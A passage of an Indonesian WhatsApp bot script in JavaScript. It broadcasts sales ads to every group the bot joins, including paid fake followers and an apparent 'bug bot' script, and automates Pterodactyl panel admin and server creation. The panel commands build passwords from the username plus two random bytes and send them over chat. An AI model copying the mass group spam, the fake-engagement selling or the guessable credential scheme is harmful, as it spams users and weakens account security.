Gratis *Script Bot Pushkontak & Jpm* Setiap Pembelian Di Atas Ram 5GB`, 
`\n*List Jasa Script Bot By anggazyy 📦*

* Jasa *Rename* Sc Bot
* Jasa *Fix SC Error*
* Jasa Ubah *Fitur Bot*
* Jasa *Fix Fitur* Error
* Jasa *Edit / Tambah* Fitur
* Jasa Ubah *SC Scan* Ke *Pairing Code*
* Dan Lain² Langsung PM Aja

*Untuk Harga Cuma 5k - 15k, Tergantung Kesulitan Codenya!*`, 
`\n*List Produk anggazyy- Official 🛒*

* Nokos Whatsapp (+62) Rp8k
* Nokos Whatsapp (+84) Rp6,5k
* Nokos Whatsapp (+998) Rp7k
* Domain *(my.id/biz.id)*
* Subdomain *(4 Subdo Rp2k)*
* SC Tema Panel Pterodactyl
* SC *anggazyybotz Terbaru* No Enc
* SC Bot Subdomain 60 Api
* SC Cpanel *(Untuk Open Resseller)*
* SC Bot Bug Terbaru
* Jasa Instal Panel *(Free Subdo)*
* Jasa Fix Error Node Panel
* DLL Tanyakan Saja!`, 
`\n*List Harga Suntik Sosmed 🛒*

*Layanan Instagram*
* 1000 Followers Rp10.000
* 1000 Like Rp5500
* 1000 Like Reels Rp10.000
* 1000 Views Reels Rp7000

*Layanan Facebook*
* 1000 Followers Rp8000
* 1000 Like Rp10.000
* 1000 Share Rp8000

*Layanan Tiktok*
* 500 Followers Rp10.000
* 1000 Like Rp8000
* 10.000 Views Rp2000

*Note :* Semua Proses Pengerjaan Tidak Mermerlukan Email/Password Akun, Di Jamin Aman 100%`]
await reply(`Memproses Mengirim Pesan Slide Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
for (let jid of usergc) {
try {
await SendSlide(jid, fs.readFileSync("./media/anggazyy.jpg"), Obj)
total += 1
} catch {}
await sleep(global.delayjpm)
}
await reply(`Berhasil Mengirim Pesan Slide Teks & Foto Ke *${total} Grup*`)
}
break
case "addadmin": {
if (!text) return reply(example("username"))
if (!isOwner) return reply(msg.owner)
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (isGroup) {
orang = m.sender
await reply("*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${user.created_at.split("T")[0]}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await anggazyy.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "addadmin2": {
if (!text) return reply(example("nama,6283XXX"))
if (!isOwner) return reply(msg.owner)
if (!args[0]) return reply(example("nama,6283XXX"))
if (!text.split(",")) return reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await anggazyy.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Buyyer Tidak Valid!")
let username = buyyer.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
await reply(`*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${ceknya}`)
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${user.created_at.split("T")[0]}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await anggazyy.relayMessage(client, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "deladmin": {
if (!isOwner) return reply(msg.owner)
if (!args[0]) return reply(example("id\n\nuntuk melihat id admin ketik *.listadmin*"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return reply("ID Admin Tidak Ditemukan!")
reply(`Berhasil Menghapus Admin Panel *${capital(getid)}*`)
}
break
case "listadmin": {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let totaladmin = 0
if (users.length < 1 ) return reply("Tidak Ada Admin Panel")
var teks = " *LIST ADMIN PANEL BOT⚡*\n\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
totaladmin += 1
teks += `\`📡ID User ${i.attributes.id}\`
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n\n`
})
teks += ` Total Admin : *${totaladmin} Admin*`
anggazyy.sendText(m.chat, teks, qtoko)
}
break
case "cpanel": case "addpanel": case "buatpanel": {
if (!isOwner && !isPremium) return reply(msg.owner)
if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
if (!args[0]) return reply(example("nama"))
global.panel = [text.toLowerCase()]
let imgnya = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/pterodactyl.jpg")}, { upload: anggazyy.waUploadToServer })
global.panel = [text.toLowerCase()]
const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: "Silahkan Pilih Ram Server Panel Yang Tersedia Di Bawah Ini"
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *1GB*
* CPU Server *40%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 1GB\",\"title\":\"Create\",\"id\":\".cp1gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *2GB*
* CPU Server *60%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 2GB\",\"title\":\"Create\",\"id\":\".cp2gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *3GB*
* CPU Server *80%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
 text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 3GB\",\"title\":\"Create\",\"id\":\".cp3gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *4GB*
* CPU Server *100%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 4GB\",\"title\":\"Create\",\"id\":\".cp4gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *5GB*
* CPU Server *120%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 5GB\",\"title\":\"Create\",\"id\":\".cp5gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *6GB*
* CPU Server *140%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 6GB\",\"title\":\"Create\",\"id\":\".cp6gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *7GB*
* CPU Server *160%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 7GB\",\"title\":\"Create\",\"id\":\".cp7gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *8GB*
* CPU Server *180%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 8GB\",\"title\":\"Create\",\"id\":\".cp8gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *9GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 9GB\",\"title\":\"Create\",\"id\":\".cp9gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *10GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 10GB\",\"title\":\"Create\",\"id\":\".cp10gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *Unlimited*
* CPU Server *Unlimited*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram Unlimited\",\"title\":\"Create\",\"id\":\".cpunliv4\"}"
                  }
                ]
              })
            }
          ]
        })
      })
    }
  }
}, {userJid: m.sender, quoted: qpayment})

await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, {
  messageId: msgii.key.id
})
}
break
case "cpanel2": case "addpanel2": case "buatpanel2": {
if (!isOwner && !isPremium) return reply(msg.owner)
if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
if (!args[0]) return reply(example("nama,6283XXX"))
if (!text.split(",")) return reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await anggazyy.onWhatsApp(ceknya)
if (check.length < 1) return reply("Nomor Buyyer Tidak Valid!")
global.panel2 = [buyyer, client]
let imgnya = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/pterodactyl.jpg")}, { upload: anggazyy.waUploadToServer })
global.panel = [text.toLowerCase()]
const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: "Silahkan Pilih Ram Server Panel Yang Tersedia Di Bawah Ini"
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *1GB*
* CPU Server *40%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 1GB\",\"title\":\"Create\",\"id\":\".cp1gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *2GB*
* CPU Server *60%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 2GB\",\"title\":\"Create\",\"id\":\".cp2gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *3GB*
* CPU Server *80%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
 text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 3GB\",\"title\":\"Create\",\"id\":\".cp3gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *4GB*
* CPU Server *100%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 4GB\",\"title\":\"Create\",\"id\":\".cp4gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *5GB*
* CPU Server *120%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 5GB\",\"title\":\"Create\",\"id\":\".cp5gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *6GB*
* CPU Server *140%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 6GB\",\"title\":\"Create\",\"id\":\".cp6gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *7GB*
* CPU Server *160%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 7GB\",\"title\":\"Create\",\"id\":\".cp7gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *8GB*
* CPU Server *180%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 8GB\",\"title\":\"Create\",\"id\":\".cp8gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *9GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 9GB\",\"title\":\"Create\",\"id\":\".cp9gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *10GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 10GB\",\"title\":\"Create\",\"id\":\".cp10gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *Unlimited*
* CPU Server *Unlimited*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+namabot2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram Unlimited\",\"title\":\"Create\",\"id\":\".cpunliv5\"}"
                  }
                ]
              })
            }
          ]
        })
      })
    }
  }
}, {userJid: m.sender, quoted: qpayment})


await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, {
  messageId: msgii.key.id
})
}
break
case "cp1gbv4": case "cp2gbv4": case "cp3gbv4": case "cp4gbv4": case "cp5gbv4": case "cp6gbv4": case "cp7gbv4": case "cp8gbv4": case "cp9gbv4": case "cp10gbv4": case "cpunliv4": {
if (!isOwner && !isPremium) return reply(msg.owner)
if (global.panel == null) return reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv4") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv4") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv4") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv4") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv4") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv4") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv4") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv4") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv4") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gbv4") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner && !isPremium) return reply(msg.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = m.sender
await reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await anggazyy.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.panel = null
}
break
